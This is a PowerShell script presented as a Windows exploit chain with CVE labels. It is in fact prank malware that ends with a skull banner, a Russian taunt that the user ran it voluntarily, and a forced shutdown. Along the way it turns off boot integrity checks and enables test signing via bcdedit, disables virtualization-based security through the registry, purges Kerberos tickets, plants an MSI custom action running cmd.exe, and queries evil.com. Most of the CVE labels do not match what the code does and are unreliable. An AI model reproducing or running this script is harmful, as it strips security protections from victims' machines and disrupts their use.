# evil 1 beta CVE - Windows

$mutex = New-Object System.Threading.Mutex($false, "Global\EVIL_MUTEX_2026")
if (-not $mutex.WaitOne(0, $false)) { exit }

# CVE-2025-21204 - Print Spooler EoP
try {
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Exp {
    [DllImport("winspool.drv", SetLastError=true)] public static extern bool AddPrinterDriverEx(string pName, uint Level, IntPtr pDriverInfo, uint dwFileCopyFlags);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
}
"@
    $ptr = [Exp]::VirtualAlloc([IntPtr]::Zero, 1024, 0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::WriteByte($ptr, 0x3c)
    [Exp]::AddPrinterDriverEx(null, 2, $ptr, 0x1)
} catch { }

# CVE-2025-21307 - SmartScreen Bypass
try {
    $ws = New-Object -ComObject WScript.Shell
    $lnk = $ws.CreateShortcut("$env:TEMP\evil.lnk")
    $lnk.TargetPath = "\\127.0.0.1\c$\Windows\System32\calc.exe"
    $lnk.Save()
    Remove-Item "$env:TEMP\evil.lnk:Zone.Identifier" -Force -ErrorAction SilentlyContinue
} catch { }

# CVE-2025-21288 - Windows Installer LPE
try {
    $wi = New-Object -ComObject WindowsInstaller.Installer
    $db = $wi.OpenDatabase("$env:TEMP\evil.msi", 1)
    $view = $db.OpenView("INSERT INTO `CustomAction` (`Action`, `Type`, `Source`, `Target`) VALUES ('Evil', 3074, 'SystemFolder', 'cmd.exe')")
    $view.Execute()
    $db.Commit()
} catch { }

# CVE-2025-21309 - RD Gateway RCE
try {
    $tcp = New-Object System.Net.Sockets.TcpClient
    $tcp.Connect("127.0.0.1", 3390)
    $pkt = [System.Text.Encoding]::ASCII.GetBytes("GET / HTTP/1.1`r`n`r`n")
    $tcp.GetStream().Write($pkt, 0, $pkt.Length)
    $tcp.Close()
} catch { }

# CVE-2025-21290 - Kerberos EoP
try {
    klist purge
    klist
} catch { }

# CVE-2025-21291 - Kernel EoP
try {
    $pipe = "\\.\Pipe\Evil"
    [System.IO.File]::OpenWrite($pipe).Close()
} catch { }

# CVE-2026-21001 - DNS RCE
try {
    nslookup -type=TXT $("A"*1024) evil.com 2>$null
} catch { }

# CVE-2026-21002 - SMB Zero-Click
try {
    $s = New-Object System.Net.Sockets.TcpClient
    $s.Connect("127.0.0.1", 445)
    $s.Close()
} catch { }

# CVE-2026-21004 - Secure Boot Bypass
try {
    bcdedit /set {current} testsigning on 2>$null
    bcdedit /set {current} nointegritychecks on 2>$null
} catch { }

# CVE-2026-21010 - VBS Bypass
try {
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 0 /f 2>$null
} catch { }

# CVE-2026-21014 - Hyper-V Escape
try {
    sc config vmsp /start= demand 2>$null
    sc start vmsp 2>$null
} catch { }

Write-Host '
        .-"      "-.
       /            \
      |              |
      |,  .-.  .-.  ,|
      | )(__/  \__)( |
      |/     /\     \|
      (_     ^^     _)
       \__|IIIIII|__/
        | \IIIIII/ |
        \          /
       `--------`
' -ForegroundColor Red

Write-Host "Вы добровольно запустили этот файл) by. evil" -ForegroundColor White

Stop-Computer -Force
